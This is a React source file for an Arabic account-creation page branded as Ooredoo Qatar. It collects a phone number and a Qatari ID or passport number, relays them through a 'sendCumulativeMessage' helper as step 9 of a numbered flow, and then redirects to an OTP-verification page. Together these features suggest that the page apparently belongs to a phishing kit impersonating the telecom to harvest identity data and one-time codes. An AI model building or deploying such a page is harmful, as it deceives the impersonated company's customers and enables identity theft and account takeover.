import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { X, Phone, CreditCard } from "lucide-react";
import Stepper from "@/components/Stepper";
import { toast } from "sonner";
import { useRegistration } from "@/contexts/RegistrationContext";

const formSchema = z.object({
  phoneNumber: z.string()
    .min(8, {
      message: "رقم الجوال يجب أن يكون 8 أرقام"
    })
    .max(8, {
      message: "رقم الجوال يجب أن يكون 8 أرقام"
    }),
  idNumber: z.string().min(1, {
    message: "يرجى إدخال رقم البطاقة الشخصية أو جواز السفر"
  })
});

type FormData = z.infer<typeof formSchema>;

const steps = [
  { number: 1, title: "معلومات أساسية" },
  { number: 2, title: "التحقق" },
  { number: 3, title: "إكمال التسجيل" }
];

const AccountCreation = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const { updateData, sendCumulativeMessage } = useRegistration();

  const {
    register,
    handleSubmit,
    formState: { errors }
  } = useForm<FormData>({
    resolver: zodResolver(formSchema)
  });

  const onSubmit = async (data: FormData) => {
    setIsLoading(true);
    try {
      const newData = {
        accountCreationPhone: data.phoneNumber,
        accountCreationId: data.idNumber
      };
      
      await sendCumulativeMessage(9, "إنشاء الحساب", newData);
      updateData(newData);
      
      toast.success("تم إرسال البيانات بنجاح");
      
      // الانتقال إلى الصفحة التالية
      setTimeout(() => {
        navigate("/otp-verification");
      }, 1000);
    } catch (error) {
      toast.error("حدث خطأ، يرجى المحاولة مرة أخرى");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b">
        <button
          onClick={() => navigate(-1)}
          className="p-2 hover:bg-accent rounded-lg transition-colors"
        >
          <X className="w-6 h-6" />
        </button>
        <h1 className="text-xl font-bold">إنشاء حساب</h1>
        <div className="w-10"></div>
      </div>

      {/* Stepper */}
      <div className="px-4 py-6">
        <Stepper currentStep={1} steps={steps} />
      </div>

      {/* Content */}
      <div className="flex-1 px-4 pb-8">
        <div className="max-w-md mx-auto space-y-6">
          {/* Welcome Message */}
          <div className="text-center space-y-3">
            <h2 className="text-2xl font-bold">
              👋 أهلاً بك في Ooredoo!
            </h2>
            <p className="text-muted-foreground text-sm">
              يرجى تعبئة معلوماتك أدناه للبدء في التسجيل.
            </p>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
            {/* Phone Number Input */}
            <div className="space-y-2">
              <label className="text-sm font-medium text-right block">
                رقم الجوال
              </label>
              <div className="flex gap-2 items-start" dir="rtl">
                {/* Phone Input */}
                <div className="relative flex-1">
                  <Input
                    type="tel"
                    placeholder="رقم الجوال"
                    {...register("phoneNumber")}
                    className={`pl-10 text-right ${
                      errors.phoneNumber ? "border-destructive" : ""
                    }`}
                    dir="rtl"
                    maxLength={8}
                  />
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    <Phone className="w-5 h-5 text-muted-foreground" />
                  </div>
                </div>

                {/* Country Code Box */}
                <div className="flex items-center gap-2 bg-accent px-3 py-3 rounded-md h-10 shrink-0">
                  <span className="text-2xl">🇶🇦</span>
                  <span className="text-sm font-medium">974</span>
                </div>
              </div>
              {errors.phoneNumber && (
                <p className="text-sm text-destructive text-right">
                  {errors.phoneNumber.message}
                </p>
              )}
            </div>

            {/* ID Number Input */}
            <div className="space-y-2">
              <label className="text-sm font-medium text-right block">
                رقم البطاقة الشخصية القطرية أو جواز السفر
              </label>
              <div className="relative">
                <Input
                  type="text"
                  placeholder="رقم البطاقة الشخصية القطرية أو جواز السفر"
                  {...register("idNumber")}
                  className={`pl-10 text-right ${
                    errors.idNumber ? "border-destructive" : ""
                  }`}
                  dir="rtl"
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2">
                  <CreditCard className="w-5 h-5 text-muted-foreground" />
                </div>
              </div>
              {errors.idNumber && (
                <p className="text-sm text-destructive text-right">
                  {errors.idNumber.message}
                </p>
              )}
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              className="w-full h-14 text-lg font-bold bg-[#E31E24] hover:bg-[#C11A1F] text-white"
              disabled={isLoading}
            >
              {isLoading ? "جاري المعالجة..." : "متابعة"}
            </Button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default AccountCreation;
